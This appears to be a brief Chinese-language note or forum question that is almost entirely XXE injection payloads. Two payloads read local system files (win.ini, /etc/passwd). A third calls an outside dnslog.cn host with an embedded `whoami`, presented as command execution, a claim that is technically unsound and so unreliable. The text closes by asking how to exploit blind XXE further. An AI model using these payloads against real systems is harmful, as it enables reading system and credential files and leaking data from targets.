XXE漏洞的利用：

1. Windows读文件。

   ```
   <?xml version="1.0"?>
   <!DOCTYPE ANY [
        <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>
   <a>&xxe;</a>
   ```

2. Linux 读文件。

   ```
   <?xml version="1.0"?>
   <!DOCTYPE ANY [
        <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
   <a>&xxe;</a>
   ```

3. dnslog尝试执行命令。

   ```
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE test [
       <!ENTITY t SYSTEM "http://`whoami`.xxx.dnslog.cn/">
       ]
   >
   <test>&t;</test>
   ```

还能怎么深入利用？特别是对于无回显XXE漏洞？...

